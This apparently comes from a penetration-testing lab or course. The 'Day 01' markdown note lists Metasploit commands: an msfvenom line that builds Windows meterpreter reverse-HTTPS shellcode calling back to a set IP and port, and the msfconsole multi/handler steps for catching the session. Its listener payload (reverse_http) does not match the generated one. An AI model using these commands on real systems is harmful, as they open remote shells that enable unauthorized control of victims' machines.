<div align="center">
  <h1>Day 01</h1>
  <br/>
</div>

<h2>Metasploit commands:</h2>
<h3>Shellcode generation:</h3>
- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.61.38 LPORT=9999 -f go

<h3>Listener:</h3>
- msfconsole
- exploit/multi/handler
- set payload windows/x64/meterpreter/reverse_http
- set LHOST <Kali IP address>
- set LPORT <non-standard port>
- run